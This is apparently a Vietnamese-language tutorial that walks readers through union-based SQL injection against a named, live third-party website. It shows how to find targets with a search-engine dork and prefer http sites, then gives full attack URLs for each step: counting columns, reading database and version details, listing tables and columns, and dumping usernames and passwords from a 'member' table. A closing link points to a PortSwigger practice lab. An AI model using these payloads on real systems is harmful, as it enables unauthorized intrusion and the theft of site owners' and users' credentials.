# Hướng dẫn tấn công SQLi trên Web thật!                                                     
By: Nguyễn Hữu Nghi
***

** Lưu ý: Bài Demo này là tấn công dựa trên web thật do mình tìm được, với mục đích học tập. Các bạn có thể làm theo nhưng vui lòng đừng thực hiện các tấn công nguy hiểm nhầm phá hoại trang web. Xin cảm ơn! **

## Bước 1:
Tìm kiếm đối tượng tấn công sử dụng lệnh: ```inurl product.php id= site vn``` thông qua các trình duyệt web thông dụng như Chrome, Edge, Cốc Cốc,....
## Bước 2:
Sau khi tìm được đối tượng tấn công.
Mình khuyên các bạn nên tìm các trang web có địa chỉ bắt đầu bằng `http` thay vì`https` thì tấn công sẽ dễ thành công hơn.
<br>
Ví dụ:
![image](https://github.com/user-attachments/assets/a7f45723-3797-426a-a32f-c7ff238794c4)
</br>
** Lưu ý: không phải trang web nào các bạn cũng thực hiện tấn công thành công được, nên đừng quá chán nản. Hãy tập trung tìm điểm yếu hoặc trang wed khác! **

## Bước 3:
Mình sẽ lấy trang web mình tìm được:
http://www.igoergo.com/_site/products.php?cat=02
- Xác định số cột <br></br>
```order by 1-- -``` nếu web vẫn bình thường hãy thử lại với số cao hơn! <br>
```order by 3-- -``` web sẽ xảy ra lỗi => Điều này có nghĩa số cột cần tìm > 1 và < 2.<br>
```order by 2-- -``` web vẫn bình thường => số cột của web này là 2.<br>
Trông nó sẽ như này: ```http://www.igoergo.com/_site/products.php?cat=02%20order%20by%202--%20-``` %20 chỉ tượng trưng cho dấu cách các bạn không cần phải lo!
- Xác định cột bị lỗi để có thể chèn code của mình vào <br></br>
Sử dụng lệnh: ```union select 1,2-- -```    
** Lưu ý: bước trên các bạn tìm được bao nhiêu cột thì bắt buộc phải gõ đủ bấy nhiêu cột.  VD: union select 1,2,3,4,5-- - <br></br>
Để lệnh chạy đc thì các bạn thêm `-` trước giá trị của `cat`. ( hoặc `id` nếu các bạn tấn công web khác mình)<br></br>
Trông như này: ```http://www.igoergo.com/_site/products.php?cat=-02%20union%20select%201,2--%20-```<br></br>
Kết quả: <br>
![image](https://github.com/user-attachments/assets/558bdd0d-fcd4-4178-9870-b9a1ecd0b54e)  </br> 
=> Điều này có nghĩa là bạn có thể chèn code vô cột 1.
**Nếu bạn nghĩ mình đã gõ đúng mà Web vẫn báo lỗi hãy kiểm tra lại từng chữ mà bạn gõ!!!**
## Bước 4:
Thực hiện chèn code bằng các lệnh: <br>
```user()``` => coi user của web <br>
```database()``` => coi thông tin về database <br>
```version()``` => coi version của database <br>
Trông như thế này: <br>
```http://www.igoergo.com/_site/products.php?cat=-02%20union%20select%20user(),2--%20-```
</br>
### Bước 4.1:
- Tìm tên các tables trong database: <br>
``` union select group_concat(table_name),2 from information_schema.tables where table_schema= database();-- -``` <br>
- Trông sẽ như này: <br>```http://www.igoergo.com/_site/products.php?cat=-02%20union%20select%20group_concat(table_name),2%20from%20information_schema.tables%20where%20table_schema=%20database();--%20-```</br>
### Bước 4.2:
- Tìm tên các cột trong 1 table cụ thể.<br>
**Thường lấy các cột trong table về chủ sở hữu web vì nó chứa các thông tin quan trọng** <br>
- Ở đây mình lấy table `member` để tấn công. <br> 
Nhưng trước tiên mình cần đổi member thành hệ thập lục phân Hex.
Link đổi sang Hex: https://www.hexator.com/ <br>
```member``` đổi sang Hex sẽ là ```6d656d626572``` <br>
- Sử dụng lệnh: ```union select group_concat(column_name),2 from information_schema.columns where table_name= 0x6d656d626572-- -``` <br>
**Lưu ý: chổ table_name thêm `0x` rồi sau đó là hex của member là `6d656d626572` <br>
- Trông như này: ```http://www.igoergo.com/_site/products.php?cat=-02%20union%20select%20group_concat(column_name),2%20from%20information_schema.columns%20where%20table_name=%200x6d656d626572--%20-``` <br>
### Bước 4.3:
- Xem nội dung trong các cột: <br>
  Sử dụng lệnh: ```union select group_concat(id,username,password),2 from member-- -``` tuy nhiên kết quả trả về sẽ bị gộp rất khó coi.<br>
  Chèn dấu `/` để dễ nhìn => `2f` => ```union select group_concat(id,0x2f,username,0x2f,password),2 from member-- -```
- Trông nó sẽ như thế này:```http://www.igoergo.com/_site/products.php?cat=-02%20union%20select%20group_concat(id,0x2f,username,0x2f,password),2%20from%20member--%20-```
### Chúc mừng bạn đã tấn công thành công!!!
<br>
<br>
<br>

***
# Lab 2: Blind SQLi

- Link to lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
- Link tải Burp Suite: https://portswigger.net/burp/communitydownload











